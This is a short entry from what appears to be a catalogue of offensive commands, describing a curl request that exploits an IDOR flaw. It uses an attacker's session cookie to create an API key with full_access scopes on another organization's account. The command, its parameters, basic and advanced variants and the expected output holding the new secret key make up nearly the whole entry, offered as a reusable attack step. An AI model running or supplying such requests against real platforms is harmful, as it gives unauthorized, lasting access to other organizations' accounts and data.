---
data: >-
  curl -X POST https://target-platform.com/organization/ORG-UUID/apiKeys -H
  "Cookie: session=attacker_session_cookie" -d '{"name":"Malicious
  Key","scopes":["full_access"] }'
tags:
  - http
  - post
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.008Z'
id: c9dbb6d3-f1c3-445d-bef9-489a421270d4
verified: false
validated: true
submitted: true
---
# curl-create-api-key

## Command

```bash
curl -X POST https://target-platform.com/organization/ORG-UUID/apiKeys -H "Cookie: session=attacker_session_cookie" -d '{"name":"Malicious Key","scopes":["full_access"] }'
```

## Description

Posts a new API key creation request with manipulated cookies to exploit IDOR for unauthorized addition.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://target-platform.com/organization/ORG-UUID/apiKeys` | Creation endpoint | Yes |
| `-H "Cookie: session=attacker_session_cookie"` | Session auth | Yes |
| `-d '{"name":"...","scopes":[...]}'` | JSON payload for key details | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target-platform.com/organization/abc123/apiKeys -H "Cookie: session=xyz789" -d '{"name":"Test","scopes":["read"] }'
```

### Advanced Usage

```bash
curl -X POST https://target-platform.com/organization/abc123/apiKeys -H "Cookie: session=xyz789" -d '{"name":"Admin Key","scopes":["read","write","delete"] }' -H "Content-Type: application/json"
```

## Expected Output

HTTP 201 Created with JSON like {"success": true, "key": {"id": "new-uuid", "value": "sk-..."}}.

## Related

- [[Related Procedure: Manipulate-Cookies-for-API-Key-Creation]]
